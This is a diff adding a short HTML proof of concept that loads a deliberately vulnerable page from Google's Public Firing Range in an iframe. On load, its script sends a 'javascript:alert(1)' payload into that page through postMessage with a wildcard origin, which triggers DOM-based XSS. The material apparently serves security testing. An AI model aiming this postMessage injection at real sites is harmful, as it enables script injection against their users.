@@ -1,0 +1,20 @@
+<html>
+
+
+<body>
+	<iframe id="target" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite" onload="myFunction()">
+
+
+	</iframe>
+
+	<script>
+		function myFunction() {
+			var target = document.getElementById('target');
+			var payload = {"url": "data:text/plain,javascript:alert(1)"};
+			target.contentWindow.postMessage(JSON.stringify(payload), "*");
+
+		}
+
+	</script>
+</body>
+</html>
